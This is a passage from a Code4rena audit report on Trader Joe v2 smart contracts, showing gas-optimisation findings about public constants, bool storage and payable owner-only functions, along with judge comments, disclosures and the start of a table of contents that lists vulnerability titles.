7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-08] Making constant variables private will save gas during deployment</h2>\n<p>When constants are marked public, extra getter functions are created, increasing the deployment cost. Marking these functions private will decrease gas cost. One can still read these variables through the source code. If they need to be accessed by an external contract, a separate single getter function can be used to return all constants as a tuple. There <a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L25-L30\">are four instances of public constants</a>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"62\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LBFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">25</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">override</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MAX_FEE</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0.1e18</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// 10%</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LBFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">27</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">override</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MIN_BIN_STEP</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// 0.01%</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LBFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">28</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">override</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MAX_BIN_STEP</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">100</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// 1%, can&#39;t be greater than 247 for indexing reasons</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LBFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">30</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">override</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MAX_PROTOCOL_SHARE</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">2_500</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// 25%</span></span></span></code></pre>\n<h2 id=\"g-09-using-bools-for-storage-incurs-overhead\" style=\"position:relative;\"><a href=\"#g-09-using-bools-for-storage-incurs-overhead\" aria-label=\"g 09 using bools for storage incurs overhead permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-09] Using <code>bool</code>s for storage incurs overhead</h2>\n<p><em>Credit: Description by <a href=\"https://gist.github.com/IllIllI000\">IllIllI000</a></em>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"63\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Booleans are more expensive than uint256 or any type that takes up a full</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // word because each write operation emits an extra SLOAD to first read the</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // slot&#39;s contents, replace the bits taken up by the boolean, and then write</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // back. This is the compiler&#39;s defense against contract upgrades and</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // pointer aliasing, and it cannot be disabled.</span></span></code></pre>\n<p><a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27\">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27</a><br>\nUse <code>uint256(1)</code> and <code>uint256(2)</code> for true/false to avoid a Gwarmaccess (<a href=\"https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058\"><strong>100 gas</strong></a>) for the extra SLOAD, and to avoid Gsset (<strong>20000 gas</strong>) when changing from <code>false</code> to <code>true</code>, after having been <code>true</code> in the past.</p>\n<p>There are 2 instances of this issue:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"64\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LBFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">-</span><span class=\"mtk7\">38</span><span class=\"mtk1\">-    </span><span class=\"mtk3\">/// @notice Whether the createLBPair function is unlocked and can be called by anyone (true) or only by owner (false)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LBFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">39</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">override</span><span class=\"mtk1\"> </span><span class=\"mtk12\">creationUnlocked</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">--</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LBToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">-</span><span class=\"mtk7\">20</span><span class=\"mtk1\">-    </span><span class=\"mtk3\">/// @dev Mapping from account to spender approvals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LBToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">21</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_spenderApprovals</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h2 id=\"g10-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\" style=\"position:relative;\"><a href=\"#g10-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\" aria-label=\"g10 functions guaranteed to revert when called by normal users can be marked payable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑10] Functions guaranteed to revert when called by normal users can be marked <code>payable</code></h2>\n<p><em>Credit: Description by <a href=\"https://gist.github.com/IllIllI000\">IllIllI000</a></em>.</p>\n<p>If a function modifier such as <code>onlyOwner</code> is used, the function will revert if a normal user tries to pay the function. Marking the function as <code>payable</code> will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are\n<code>CALLVALUE</code>(2),<code>DUP1</code>(3),<code>ISZERO</code>(3),<code>PUSH2</code>(3),<code>JUMPI</code>(10),<code>PUSH1</code>(3),<code>DUP1</code>(3),<code>REVERT</code>(0),<code>JUMPDEST</code>(1),<code>POP</code>(2), which costs an average of about <strong>21 gas per call</strong> to the function, in addition to the extra deployment cost</p>\n<p>There are 14 instances of this:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"65\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">libraries</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PendingOwnable</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">59</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setPendingOwner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pendingOwner_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">libraries</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PendingOwnable</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">68</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">revokePendingOwner</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">libraries</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PendingOwnable</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">84</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">renounceOwnership</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LBFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">215</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setLBPairImplementation</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_LBPairImplementation</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LBFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">317</span><span class=\"mtk1\">:    ) </span><span class=\"mtk12\">external</span><span class=\"mtk1\"> </span><span class=\"mtk12\">override</span><span class=\"mtk1\"> </span><span class=\"mtk12\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LBFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">350</span><span class=\"mtk1\">:    ) </span><span class=\"mtk12\">external</span><span class=\"mtk1\"> </span><span class=\"mtk12\">override</span><span class=\"mtk1\"> </span><span class=\"mtk12\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LBFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">396</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">removePreset</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_binStep</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LBFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">434</span><span class=\"mtk1\">:    ) </span><span class=\"mtk12\">external</span><span class=\"mtk1\"> </span><span class=\"mtk12\">override</span><span class=\"mtk1\"> </span><span class=\"mtk12\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LBFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">468</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setFeeRecipient</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_feeRecipient</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LBFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">474</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setFlashLoanFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_flashLoanFee</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LBFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">485</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setFactoryLockedState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_locked</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LBFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">493</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">addQuoteAsset</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_quoteAsset</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LBFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">502</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">removeQuoteAsset</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_quoteAsset</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LBFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">520</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">forceDecay</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ILBPair</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_LBPair</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/250\">0x0Louis (Trader Joe) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/250#issuecomment-1309552327\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p><strong>[G-01] Owner token enumeration is an extremely expensive operation but it is not essential to the protocol</strong><br>\nI think awarding 20k would be too high vs the rest of the reports, but this should save on average 40k as it skips 2 SSTORE on fresh slots</p>\n<p><strong>[G-02] Using Solidity version 0.8.17 will provide an overall gas optimization</strong><br>\n1k</p>\n<p>Will temporarily award 21k as it’s the one report that eliminated SLOADs vs less impactful refactorings</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/250#issuecomment-1310432431\">shung (warden) commented</a>:</strong></p>\n<blockquote>\n<p>G-01 recommendation was applied to the main repo: <a href=\"https://github.com/traderjoe-xyz/joe-v2/commit/b29b6bfbf9ac39ce3cd56a81404126204aaf07b5\">traderjoe-xyz/joe-v2@b29b6bf</a></p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/250#issuecomment-1317684902\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Will not use 20k to rate the rest of reports but because of exceptional finding am awarding this report the win.</p>\n</blockquote>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-5\">High Risk Findings (5)</a></p>\n<ul>\n<li><a href=\"#h-01-transfering-funds-to-yourself-increases-your-balance\">[H-01] Transfering funds to yourself increases your balance</a></li>\n<li><a href=\"#h-02-incorrect-output-amount-calculation-for-trader-joe-v1-pools\">[H-02] Incorrect output amount calculation for Trader Joe V1 pools</a></li>\n<li><a href=\"#h-03-wrong-implementation-of-function-lbpairsetfeeparameter-can-break-the-funcionality-of-lbpair-and-make-users-tokens-locked-\">[H-03] Wrong implementation of function <code>LBPair.setFeeParameter</code> can break the funcionality of LBPair and make user’s tokens locked </a></li>\n<li><a href=\"#h-04-wrong-calculation-in-function-lbrouter_getamountsin-make-user-lose-a-lot-of-tokens-when-swap-through-joepair-most-of-them-will-gifted-to-joepair-freely\">[H-04] Wrong calculation in function <code>LBRouter._getAmountsIn</code> make user lose a lot of tokens when swap through JoePair (most of them will gifted to JoePair freely)</a></li>\n<li><a href=\"#h-05-attacker-can-steal-entire-reserves-by-abusing-fee-calculation\">[H-05] Attacker can steal entire reserves by abusing fee calculation</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-7\">Medium Risk Findings (7)</a></p>\n<ul>\n<li><a href=\"#m-01-lbrouterremoveliquidity-returning-wrong-values\">[M-01] <code>LBRouter.removeLiquidity</code> returning wrong values</a></li>\n<li><a href=\"#m-02-beforetokentransfer-called-with-wrong-parameters-in-lbtoken_burn\">[M-02] <code>beforeTokenTransfer</code> called with wrong parameters in <code>LBToken._burn</code></a></li>\n<li><a href=\"#m-03-flashloan-fee-collection-mechanism-can-be-easily-manipulated\">[M-03] Flashloan fee collection mechanism can be easily manipulated</a></li>\n<li><a href=\"#m-04-very-critical-owner-privileges-can-cause-complete-destruction-of-the-project-in-a-possible-privatekey-exploit\">[M-04] Very critical <code>Owner</code> privileges can cause complete destruction of the project in a possible privateKey exploit</a></li>\n<li><a href=\"#m-05-attacker-can-keep-fees-max-at-no-cost\">[M-05] Attacker can keep fees max at no cost</a></li>\n<li><a href=\"#m-06-calling-swapavaxforexacttokens-function-while-sending-excess-amount-cannot-refund-such-excess-amount\">[M-06] Calling <code>swapAVAXForExactTokens</code> function while sending excess amount cannot refund such excess amount</a></li>\n<li><a href=\"#m-07-incorrect-fee-calculation-on-lbpair-fees-collected-on-swaps-are-less-than-what-they-should-be\">[M-07] Incorrect fee calculation on LBPair (fees collected on swaps are less than what they “should” be)</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#summary-1\">Summary</a></li>\n<li><a href=\"#l-01-missing-sanity-checks-on-to-addresses-in-lbroutersol\">L-01 Missing sanity checks on <code>to</code> addresses in 